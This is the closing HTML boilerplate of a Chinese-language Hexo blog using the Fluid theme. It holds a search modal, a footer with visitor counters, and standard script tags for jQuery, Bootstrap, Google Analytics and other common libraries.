  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-225072278-1', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-7QWZC1M2Z8"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-7QWZC1M2Z8');
    </script>
  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
